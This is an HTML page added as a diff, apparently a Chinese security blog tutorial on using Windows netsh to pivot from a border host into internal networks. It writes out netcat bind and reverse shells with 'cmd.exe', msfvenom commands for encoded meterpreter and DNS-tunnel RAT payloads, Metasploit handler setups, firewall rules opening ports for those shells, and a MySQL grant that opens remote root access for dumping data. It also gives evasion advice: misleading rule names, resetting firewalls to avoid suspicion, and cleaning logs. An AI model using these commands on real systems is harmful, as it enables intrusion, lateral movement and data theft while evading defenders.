@@ -1,0 +1,734 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,APT,内网渗透," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> 边界跨越简易入门 Windows 运维工具 netsh // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              边界跨越简易入门 Windows 运维工具 netsh
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2018-02-11
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2018/02/11/netsh-tutorial/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2018/02/11/netsh-tutorial/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="netsh-的使用前提"><a href="#netsh-的使用前提" class="headerlink" title="netsh 的使用前提"></a>netsh 的使用前提</h1><p><strong>什么是边界主机</strong><br>横跨多个网络的主机即为边界主机，单个主机拥有多个IP地址。(可以只有一块物理网卡，不过可能会有多块虚拟网卡)</p>
+<p>边界主机是 Windows 系统。</p>
+<h1 id="netsh-是什么"><a href="#netsh-是什么" class="headerlink" title="netsh 是什么"></a>netsh 是什么</h1><p>核心功能<br>a. 防火墙规则配置<br>b. 端口转发(边界跨越的核心!)</p>
+<p>netsh 是微软自带的一款高级网络配置管理工具，用它可以轻松的管理本地或者远程机器的 Windows 防火墙及各类系统网络配置。<br>不得不说，对运维来讲，它确实是个非常趁手的 Windows 系统配置管理工具，同样对于入侵者来讲，它亦是一款非常好用的渗透工具，<br>比如，常规 TCP，UDP 端口“正向”转发以及对指定的防火墙规则的各种增删操作。</p>
+<h1 id="简单解释一下-netsh-portproxy-的工作方式"><a href="#简单解释一下-netsh-portproxy-的工作方式" class="headerlink" title="简单解释一下 netsh portproxy 的工作方式"></a>简单解释一下 netsh portproxy 的工作方式</h1><p>注意，此处所说的所有场景均有一个最基本的前提：即执行netsh操作的那台机器，必须处在目标边界上[换句话说，这台主机上通常有多张网卡，若干张内网网卡+若干张外网网卡]。<br>这样一来，我们才能利用这台处于网络边界的主机作为跳板，再通过 netsh 对目标内网中各类资源进行灵活访问。</p>
+<p>再次强调 netsh 的 portproxy 是没有任何反向转发功能的。说的稍微形象一点 portproxy 就是类似一个主动 bind 的过程，一旦用 netsh 执行应用某条转发规则时，<br>就会自动在本地监听相应端口，当有任何外部指向该端口的连接过来时都会将其转发到指定主机的指定端口上。<br>其实，由此不难看出，用于转发的主机必须和要转发到达的目的主机之间保持 <strong>互通</strong> 才行， 即 “这两台主机，要么同时在公网，要么同时在内网”，公网是不能直接转发到内网的。</p>
+<h1 id="实战中-netsh-可能的应用的渗透场景"><a href="#实战中-netsh-可能的应用的渗透场景" class="headerlink" title="实战中 netsh 可能的应用的渗透场景"></a>实战中 netsh 可能的应用的渗透场景</h1><ul>
+<li>通过在目标边界机器上执行 netsh 转发，连接目标内网中的 ssh。</li>
+<li>通过在目标边界机器上执行 netsh 转发，连接目标内网中的 rdp。</li>
+<li>通过在目标边界机器上执行 netsh 转发，连接目标内网中的 http web系统 转发到外网访问。</li>
+<li>通过在目标边界机器上执行 netsh 转发，连接目标内网中的 mysql/mssql，导出数据库。</li>
+<li>通过在目标边界机器上执行 netsh 转发，连接目标内网中的 bind 类型的 meterpreter。</li>
+<li>通过在目标边界机器上执行 netsh 转发，让目标内网中不能正常连接外网的机器也能正常 reverse 回弹 meterpreter。</li>
+</ul>
+<h1 id="Windows-Server-2003-下的-netsh"><a href="#Windows-Server-2003-下的-netsh" class="headerlink" title="Windows Server 2003 下的 netsh"></a>Windows Server 2003 下的 netsh</h1><p>在 Windows Server 2003 下使用 netsh，需要先安装 ipv6 支持。由于 netsh 同时支持 ipv4 和 ipv6 的端口转发， 如果不安装 ipv6 ， netsh 可能会遇到产生某些异常无法正常使用。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh<span class="built_in"> interface ipv6 </span>install</div></pre></td></tr></table></figure>
+<h1 id="使用-netsh-对目标主机防火墙进行简单管理"><a href="#使用-netsh-对目标主机防火墙进行简单管理" class="headerlink" title="使用 netsh 对目标主机防火墙进行简单管理"></a>使用 netsh 对目标主机防火墙进行简单管理</h1><h2 id="对于-Windows-Server-2003-及以下系统"><a href="#对于-Windows-Server-2003-及以下系统" class="headerlink" title="对于 Windows Server 2003 及以下系统"></a>对于 Windows Server 2003 及以下系统</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> netsh firewall show state 查看当前防火墙状态</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span> 关闭当前系统防火墙 (需要管理员权限，360安全卫士会告警)</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh firewall <span class="built_in">set</span> opmode <span class="built_in">enable</span> 启动当前系统防火墙 (需要管理员权限)</span></div></pre></td></tr></table></figure>
+<h2 id="对于高于-Windows-Server-2003-的系统"><a href="#对于高于-Windows-Server-2003-的系统" class="headerlink" title="对于高于 Windows Server 2003 的系统"></a>对于高于 Windows Server 2003 的系统</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall show allprofiles 查看当前系统所有网络类型的防火墙状态，比如 私有，公共，域网咯</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall <span class="built_in">set</span> allprofiles state off 关闭当前系统防火墙(需要管理员权限，360安全卫士并未告警 Win10+2018.02.11+360安全卫士)</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall <span class="built_in">set</span> allprofiles state on 关闭当前系统防火墙(需要管理员权限)</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall reset 重置当前系统的所有防火墙规则，会回到刚装完系统的初始状态(需要管理员权限)</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">"C:\windows\temp\fw.log"</span> 自定义防火墙日志的路径 (需要管理员权限)</span></div></pre></td></tr></table></figure>
+<h1 id="关于操作防火墙时的注意事项"><a href="#关于操作防火墙时的注意事项" class="headerlink" title="关于操作防火墙时的注意事项"></a>关于操作防火墙时的注意事项</h1><p>没有极为特殊的情况时，非常不建议去直接关闭目标的防火墙。因为有些目标主机的服务可能会依托防火墙进行，如果只是简单粗暴的把目标主机的防火墙直接关闭，可能会造成目标主机的某些服务出现访问异常，万一被监控捕获并告警，就有些得不偿失了。一旦被人有所察觉，下次再渗透就不太容易了。况且，大部分情况下，我们根本没必要非要去把对方防火墙完全关闭。</p>
+<p>假如面对情况比较复杂时，建议先把现有的防火墙规则导出来，然后再关闭防火墙。如果出现意外，及时重新打开防火墙导入规则。</p>
+<p>最后，注意“重置防火墙规则”，它会把防火墙规则重置到系统刚安装好的状态，如果规则里还有目标单位运维人员自行添加的一些规则，也就意味着会被一并删除掉，这个效果与直接关闭目标防火墙基本是一样的，不过相对好一点。</p>
+<p>重置目标的防火墙，缺乏经验的运维可能会认为这是系统自身问题，因为毕竟重置后防火墙还开着呢；但如果直接关闭防火墙，不免会引起别人怀疑。</p>
+<h1 id="使用-netsh-修改防火墙规则"><a href="#使用-netsh-修改防火墙规则" class="headerlink" title="使用 netsh 修改防火墙规则"></a>使用 netsh 修改防火墙规则</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">add 增加规则</div><div class="line"><span class="keyword">delete</span> 删除规则</div><div class="line"><span class="keyword">allow</span> 允许连接</div><div class="line"><span class="keyword">block</span> 阻断连接</div><div class="line"><span class="keyword">in</span> 入站</div><div class="line"><span class="keyword">out</span> 出站</div><div class="line"><span class="keyword">name</span> 为要显示的规则名称</div></pre></td></tr></table></figure>
+<h2 id="根据端口"><a href="#根据端口" class="headerlink" title="根据端口"></a>根据端口</h2><p>a. 首先我们可以 <strong>根据端口</strong> 来添加或删除指定的出，入站规则。<br>注意这个规则名称，实际中显然要起的更具迷惑性一些，不然容易被对方一眼看出。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">允许外部来连接本地的 tcp 53 端口</div><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall firewall add rule name=<span class="string">"nc bind shell"</span> dir=<span class="keyword">in</span> action=allow protocol=TCP localport=53</span></div><div class="line"><span class="meta">#</span><span class="bash"> (管理员权限，360安全卫士无告警)</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall firewall delete rule name=<span class="string">"nc bind shell"</span> dir=<span class="keyword">in</span> protocol=TCP localport=53</span></div></pre></td></tr></table></figure>
+<p>举个例子<br>正向连接<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -lvp <span class="number">53</span> -e <span class="keyword">cmd</span>.<span class="bash">exe <span class="comment"># Server主机/受害者</span></span></div><div class="line"><span class="bash">nc -nv 192.168.3.101 53 <span class="comment"># Client主机/攻击者</span></span></div></pre></td></tr></table></figure></p>
+<p>反向连接<br>要做反向连接的话首先得在攻击主机上打开端口<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">netsh<span class="built_in"> firewall </span><span class="builtin-name">add</span> portopening TCP 53 <span class="string">"nc reverse shell listening port"</span></div><div class="line">nc -lvp 53</div><div class="line"><span class="comment"># 搞完事记得删除防火墙规则</span></div><div class="line">netsh<span class="built_in"> firewall </span>delete portopening TCP 53</div></pre></td></tr></table></figure></p>
+<p>在受害主机上的操作<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=<span class="string">"nc reverse shell"</span> <span class="attribute">dir</span>=out <span class="attribute">action</span>=allow <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=53</div><div class="line">nc -nv 192.168.3.102 53 -e cmd.exe</div><div class="line"><span class="comment"># 搞完事记得删除防火墙规则</span></div><div class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=<span class="string">"nc reverse shell"</span> <span class="attribute">dir</span>=out <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=53</div></pre></td></tr></table></figure></p>
+<h2 id="根据进程"><a href="#根据进程" class="headerlink" title="根据进程"></a>根据进程</h2><p><strong>注意</strong> 实际测试发现对进程的出入站控制并不是很到位</p>
+<p>2003 以下<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netsh<span class="built_in"> firewall </span><span class="builtin-name">add</span> allowedprogram c:\nc.exe <span class="string">"allow nc"</span> enable</div><div class="line">nc -nv 192.168.3.101 53</div><div class="line">nc -lvp 53</div></pre></td></tr></table></figure></p>
+<p>2003 以上<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=<span class="string">"pass nc"</span> <span class="attribute">dir</span>=in <span class="attribute">action</span>=allow <span class="attribute">program</span>=<span class="string">"C:\nc.exe"</span></div><div class="line">nc -lvp 53 -e cmd.exe</div><div class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=<span class="string">"pass nc"</span> <span class="attribute">dir</span>=in <span class="attribute">program</span>=<span class="string">"C:\nc.exe"</span></div></pre></td></tr></table></figure></p>
+<h1 id="ssh-中继示例"><a href="#ssh-中继示例" class="headerlink" title="ssh 中继示例"></a>ssh 中继示例</h1><p>网络边界跳板机</p>
+<p>允许外部的 TCP 8081 端口连入<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> <span class="attribute">rule</span>=<span class="string">"OldLNMP ssh"</span> <span class="attribute">dir</span>=in <span class="attribute">action</span>=allow <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=8081</div></pre></td></tr></table></figure></p>
+<p>网络边界的跳板机<br>把来自外部的 TCP 8081 端口流量全部转发到目标内网的OldLNMP主机的 TCP 22 端口上，地址类型为 ipv4 到 ipv4。 默认会监听在 0.0.0.0 的 8081 上</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">netsh<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenport</span>=8081 <span class="attribute">connectaddress</span>=192.168.4.14 <span class="attribute">connectport</span>=22</div><div class="line">(会修改注册表/360安全卫士告警两次/一次是修改网络设置/另一次是修改注册表)</div><div class="line">netsh<span class="built_in"> interface </span>portproxy show all</div><div class="line">查看所有转发规则</div><div class="line">netstat -ano | findstr 8081</div><div class="line"></div><div class="line"><span class="comment"># 搞完事记得恢复原状</span></div><div class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">nam</span>=<span class="string">"OldLNMP"</span> <span class="attribute">dir</span>=in <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=8081</div><div class="line">netsh<span class="built_in"> interface </span>portproxy delete v4tov4 <span class="attribute">listenport</span>=8081 (360安全卫士告警)</div></pre></td></tr></table></figure>
+<h1 id="rdp中继示例"><a href="#rdp中继示例" class="headerlink" title="rdp中继示例"></a>rdp中继示例</h1><p>将来自外部的 TCP 389 端口流量全部转发到内网的 2008r2-dc 主机的 TCP 3389 端口</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> <span class="attribute">rule</span>=<span class="string">"2008r2-dc rdp"</span> <span class="attribute">dir</span>=in <span class="attribute">action</span>=allow <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=389</div><div class="line">netsh<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenport</span>=389 <span class="attribute">connectaddress</span>=192.168.5.6 <span class="attribute">connectport</span>=3389</div><div class="line">netsh<span class="built_in"> interface </span>portproxy show all</div><div class="line">netstat -ano | findstr <span class="string">":389"</span></div><div class="line"></div><div class="line"><span class="comment"># 搞完事记得恢复原状</span></div><div class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=<span class="string">"2008r2-dc rdp"</span> <span class="attribute">dir</span>=in <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=389</div><div class="line">netsh<span class="built_in"> interface </span>portproxy delete v4tov4 <span class="attribute">listenport</span>=389</div></pre></td></tr></table></figure>
+<h1 id="数据库管理端口中继示例"><a href="#数据库管理端口中继示例" class="headerlink" title="数据库管理端口中继示例"></a>数据库管理端口中继示例</h1><p>经常遇到数据库可能有 mysql, mssql, pgsql, oracle, db2 …</p>
+<p>到 内网数据库服务器(OldLNMP) 上执行，开启 mysql 外连，如果边界机器是 web 服务器， 数据库服务器和web服务器之间的连接基本是通的；如果边界机器不是 web 服务器，可能就要自己想办法开启权限了。</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql <span class="params">-uroot</span> <span class="params">-p</span> <span class="params">-S</span> /tmp/mysql.sock</div><div class="line">mysql&gt; grant <span class="literal">all</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'root'</span>@<span class="string">'%'</span> identified <span class="keyword">by</span> <span class="string">'admin'</span> <span class="keyword">with</span> grant option; flush privileges;</div></pre></td></tr></table></figure>
+<p>换到边界跳板机<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=<span class="string">"OldLNMP MySQL dump"</span> <span class="attribute">dir</span>=in <span class="attribute">action</span>=allow <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=3568</div><div class="line">net<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenport</span>=3568 <span class="attribute">connectaddress</span>=192.168.4.14 <span class="attribute">connectport</span>=3306</div><div class="line"><span class="comment"># netsh interface portproxy show all</span></div><div class="line"><span class="comment"># netsh -ano | findstr "3568"</span></div><div class="line"></div><div class="line"><span class="comment"># 完事后清理添加的记录</span></div><div class="line"><span class="comment"># netsh advfirewall firewall delete rule name="OldLNMP MySQL dump" dir=in protocol=TCP localport=3568</span></div><div class="line"><span class="comment"># netsh interface portproxy delete v4tov4 listenport=3568</span></div></pre></td></tr></table></figure></p>
+<p>切换到攻击机<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">navicat ip: 192.168.3.101<span class="built_in"> port </span>3568 root:admin</div></pre></td></tr></table></figure></p>
+<h1 id="RAT-正向中继"><a href="#RAT-正向中继" class="headerlink" title="RAT 正向中继"></a>RAT 正向中继</h1><p>攻击机 -&gt; 跳板机/边界web服务器 -&gt; 内网主机/bind_meterpreter</p>
+<p>此处的 ahost 的参数为 allowed host [允许访问的主机]，填写的是边界跳板机的IP。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -<span class="selector-tag">a</span> x86 --platform Windows -<span class="selector-tag">p</span> windows/meterpreter/bind_hidden_tcp LPORT=<span class="number">443</span> AHOST=<span class="number">192.168</span>.<span class="number">5.2</span> -e x86/shikata_ga_nai -<span class="selector-tag">b</span> <span class="string">'\x00'</span> -<span class="selector-tag">i</span> <span class="number">3</span> -f exe &gt; bind_meterpreter.exe</div></pre></td></tr></table></figure>
+<p>在跳板机上执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> netsh advfirewall firewall add rule=<span class="string">"bind hidden meterpreter"</span> dir=<span class="keyword">in</span> action=allow protocol=TCP localport=4443</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh interface portproxy add v4tov4 listenport=4443 connectaddress=192.168.5.4 connectport=443</span></div><div class="line"><span class="meta">#</span><span class="bash"> netsh interface portproxy show all</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -ano | findstr <span class="string">"4443"</span></span></div></pre></td></tr></table></figure></p>
+<p>在受害机上执行 bind_meterpreter.exe<br>确认端口正常开启，处于监听状态<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ano <span class="string">| findstr "</span>:<span class="number">443</span><span class="string">"</span></div></pre></td></tr></table></figure></p>
+<p>攻击机(CobaltStrike服务器) 向跳板机连接<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 先用nc试探一下 确认端口开放 再用msf</span></div><div class="line">nc -nv 192.168.3.101 4443</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># msf</span></div><div class="line">msf&gt; use exploit/multi/handler</div><div class="line"><span class="builtin-name">set</span> payload windows/meterpreter/bind_hidden_tcp</div><div class="line"><span class="builtin-name">set</span> ahost 192.168.5.2</div><div class="line"><span class="builtin-name">set</span> rhost 192.168.3.101</div><div class="line"><span class="builtin-name">set</span> lport 4443</div><div class="line"><span class="builtin-name">set</span> ExitOnSession <span class="literal">false</span></div><div class="line">exploit -j</div></pre></td></tr></table></figure></p>
+<p>完事后记得清理<br>跳板机 和 内网受害机</p>
+<p>清理跳板机<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=<span class="string">"bind hidden meterpreter"</span> <span class="attribute">dir</span>=in <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=4443</div><div class="line">netsh<span class="built_in"> interface </span>portproxy delete v4tov4 <span class="attribute">listenport</span>=4443</div><div class="line">netsh<span class="built_in"> interface </span>portproxy show all</div></pre></td></tr></table></figure></p>
+<h1 id="RAT-反向中继-DNS隧道"><a href="#RAT-反向中继-DNS隧道" class="headerlink" title="RAT 反向中继 (DNS隧道)"></a>RAT 反向中继 (DNS隧道)</h1><p>攻击机/Cobalt Strike服务器<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">msf&gt; use exploit/multi/handler</div><div class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp_rc4_dns</span></div><div class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.3.96</span></div><div class="line"><span class="keyword">set</span> <span class="comment">lport 53</span></div><div class="line"><span class="keyword">set</span> <span class="comment">rc4password test</span></div><div class="line"><span class="keyword">set</span> <span class="comment">ExitOnSession false</span></div><div class="line">exploit <span class="comment">-j</span></div></pre></td></tr></table></figure></p>
+<p>生成 rat/payload<br>注意回连IP写的是 跳板机/边界主机 的IP<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -<span class="selector-tag">a</span> x86 --platform Windows -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp_rc4_dns LHOST=<span class="number">192.168</span>.<span class="number">5.2</span> LPORT=<span class="number">53</span> RC4PASSWORD=test -e x86/shikata_ga_nai -<span class="selector-tag">b</span> <span class="string">'\x00'</span> -f exe &gt; dns_tunnel.exe</div></pre></td></tr></table></figure></p>
+<p>在跳板机/网络边界主机执行<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># netsh advfirewall firewall add rule name=<span class="string">"dns rc4 shell"</span> dir=in action=allow protocol=TCP localport=<span class="number">53</span></div><div class="line"></div><div class="line"># netsh interface portproxy add v4tov4 listenport=<span class="number">54</span> listenaddress=<span class="number">192.168</span><span class="number">.5</span><span class="number">.2</span> connectaddress=<span class="number">192.168</span><span class="number">.3</span><span class="number">.96</span>&lt;攻击机/CS服务器&gt; connectport=<span class="number">53</span></div><div class="line"></div><div class="line"># netstat -ano | findstr <span class="string">":53"</span></div></pre></td></tr></table></figure></p>
+<p>在受害主机执行 dns_tunnel.exe<br>需要说明的是 dns_tunnel 的 RAT 一般响应较慢<br>毕竟有效载荷小，传输损耗大</p>
+<p>清理 跳板机/边界跨越主机<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=<span class="string">"dns rc4 shell"</span> <span class="attribute">dir</span>=in <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=53</div><div class="line">netsh<span class="built_in"> interface </span>portproxy delete v4tov4 <span class="attribute">listenport</span>=53 <span class="attribute">listenaddress</span>=192.168.5.2&lt;跳板机与受害机可连通的ip接口&gt;</div></pre></td></tr></table></figure></p>
+<h1 id="关于利用-netsh-进行端口转发基本原则"><a href="#关于利用-netsh-进行端口转发基本原则" class="headerlink" title="关于利用 netsh 进行端口转发基本原则"></a>关于利用 netsh 进行端口转发基本原则</h1><p><strong>什么叫穿透性较好的端口</strong><br>即是大多数运维人员在配置防火墙策略时一般都会放行的端口。</p>
+<ol>
+<li>尽量选择一些穿透性较好的端口，例如 53,443,80 … 尽可能不用高端口，使用的端口不能与系统现有的端口冲突。</li>
+<li>注意目标边界和内网防火墙的问题，绝大多数的渗透过程出现的端口不通的情况，都是因为防火墙的原因。实战中要尽量仔细搜集，准备充分后再操作。</li>
+<li>出入站规则名要具有迷惑性</li>
+<li>处理好转发日志</li>
+</ol>
+<h1 id="使用-netsh-进行端口转发的优势与弊端"><a href="#使用-netsh-进行端口转发的优势与弊端" class="headerlink" title="使用 netsh 进行端口转发的优势与弊端"></a>使用 netsh 进行端口转发的优势与弊端</h1><ol>
+<li>如果目标的系统实时监控防火墙规则的变动(例如主机有agent实时监控，与监控服务器存在心跳联系)，这么做极易触发告警，隐蔽性非常差。</li>
+<li>只能单个端口转发，配置起来比较繁琐</li>
